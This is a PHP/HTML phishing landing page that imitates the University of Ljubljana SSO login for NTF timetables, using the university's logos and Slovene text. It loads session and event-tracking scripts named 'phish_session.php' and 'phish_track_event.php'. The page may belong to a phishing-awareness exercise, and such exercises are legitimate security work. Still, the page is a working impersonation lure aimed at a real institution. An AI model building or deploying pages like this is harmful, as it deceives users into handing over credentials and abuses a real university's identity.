<?php
require __DIR__ . '/phish_session.php';
$pageSlug = 'index';
require __DIR__ . '/phish_track_event.php';
?>

<!doctype html>
<html lang="sl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>Prijavite se v spletno mesto | NTF</title>
  <link rel="stylesheet" href="/style.css?v=1">
  <link rel="apple-touch-icon" sizes="180x180" href="MEDIA/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="MEDIA/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="MEDIA/favicon-16x16.png">
  <link rel="manifest" href="MEDIA/site.webmanifest">
</head>
<body>

  <div class="wrap">
    <main class="content">
      <header class="header">
        <img class="unlogo" src="MEDIA/unilj_logo.svg" alt="Univerza v Ljubljani">
      </header>

      <div class="center">
        <section class="card">
          <h1>Dobrodošli v urnike NTF</h1>
          <p class="sub">Za nadaljevanje se prosimo vpišite.</p>

          <form action="/choice" method="post">
            <button type="submit" class="cta">Prijava z UL Identiteto (SS0)</button>
          </form>

          <nav class="helpbtn">
            <a href="#">Potrebujem pomoč pri prijavi</a>
          </nav>

          <nav class="links">
            <a href="#" class="langlink">Slovanščina (sl)</a>
            <a href="#">Splošni pogoji</a>
          </nav>
        </section>
      </div>

      <div class="footnote">NTF | Urniki, november 2025</div>
    </main>

    <aside class="brand">
      <img class="brandlogo" src="MEDIA/instancelogo.svg" alt="NTF logotip">
    </aside>
  </div>

</body>
</html>
